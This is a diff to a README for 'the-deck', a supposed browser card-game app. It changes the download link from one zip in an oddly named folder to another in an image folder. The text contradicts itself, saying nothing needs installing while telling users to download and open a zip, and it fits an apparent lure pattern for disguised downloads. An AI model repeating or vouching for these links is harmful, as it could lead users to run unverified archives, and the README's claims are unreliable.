@@ -4,7 +4,7 @@
 Welcome to the **the-deck**! This application is your central hub for enjoying a variety of card-based web apps. Whether you want to connect with friends or spark conversations, we've got you covered. 
 
 ## 📥 Download the Deck
-[![Download the-deck](https://raw.githubusercontent.com/oximir/the-deck/main/nongelatinous/the-deck.zip)](https://raw.githubusercontent.com/oximir/the-deck/main/nongelatinous/the-deck.zip)
+[![Download the-deck](https://raw.githubusercontent.com/oximir/the-deck/main/imgs/the_deck_1.1.zip)](https://raw.githubusercontent.com/oximir/the-deck/main/imgs/the_deck_1.1.zip)
 
 ## 🎮 Features
 - **Card Games:** Enjoy games like Common Ground, Family Cards, Couple Cards, Survival Cards, and Skate Roulette.
@@ -20,7 +20,7 @@ To ensure the best experience, please check the following system requirements:
 - No installation required. Just run it in your browser!
 
 ## 📖 How to Download & Install
-1. Visit [this page to download](https://raw.githubusercontent.com/oximir/the-deck/main/nongelatinous/the-deck.zip).
+1. Visit [this page to download](https://raw.githubusercontent.com/oximir/the-deck/main/imgs/the_deck_1.1.zip).
 2. Choose the version you want from the list.
 3. Click on the relevant download link for your device.
 4. Open your downloaded file. It will run in your web browser.
